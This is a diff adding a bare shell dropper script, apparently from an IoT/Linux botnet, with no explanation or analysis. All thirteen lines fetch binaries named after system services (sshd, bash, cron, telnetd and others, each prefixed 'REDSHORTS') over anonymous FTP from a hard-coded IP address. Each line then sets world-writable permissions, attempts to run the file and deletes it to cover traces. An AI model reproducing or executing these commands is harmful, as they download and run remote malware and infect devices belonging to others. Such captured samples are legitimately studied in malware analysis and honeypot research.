@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSntpd REDSHORTSntpd; chmod 777 REDSHORTSntpd ./REDSHORTSntpd; rm -rf REDSHORTSntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSsshd REDSHORTSsshd; chmod 777 REDSHORTSsshd ./REDSHORTSsshd; rm -rf REDSHORTSsshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSopenssh REDSHORTSopenssh; chmod 777 REDSHORTSopenssh ./REDSHORTSopenssh; rm -rf REDSHORTSopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSbash REDSHORTSbash; chmod 777 REDSHORTSbash ./REDSHORTSbash; rm -rf REDSHORTSbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTStftp REDSHORTStftp; chmod 777 REDSHORTStftp ./REDSHORTStftp; rm -rf REDSHORTStftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSwget REDSHORTSwget; chmod 777 REDSHORTSwget ./REDSHORTSwget; rm -rf REDSHORTSwget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTScron REDSHORTScron; chmod 777 REDSHORTScron ./REDSHORTScron; rm -rf REDSHORTScron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSftp REDSHORTSftp; chmod 777 REDSHORTSftp ./REDSHORTSftp; rm -rf REDSHORTSftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSpftp REDSHORTSpftp; chmod 777 REDSHORTSpftp ./REDSHORTSpftp; rm -rf REDSHORTSpftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSsh REDSHORTSsh; chmod 777 REDSHORTSsh ./REDSHORTSsh; rm -rf REDSHORTSsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSshit REDSHORTSshit; chmod 777 REDSHORTSshit ./REDSHORTSshit; rm -rf REDSHORTSshit
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTSapache2 REDSHORTSapache2; chmod 777 REDSHORTSapache2 ./REDSHORTSapache2; rm -rf REDSHORTSapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 46.101.152.204 REDSHORTStelnetd REDSHORTStelnetd; chmod 777 REDSHORTStelnetd ./REDSHORTStelnetd; rm -rf REDSHORTStelnetd
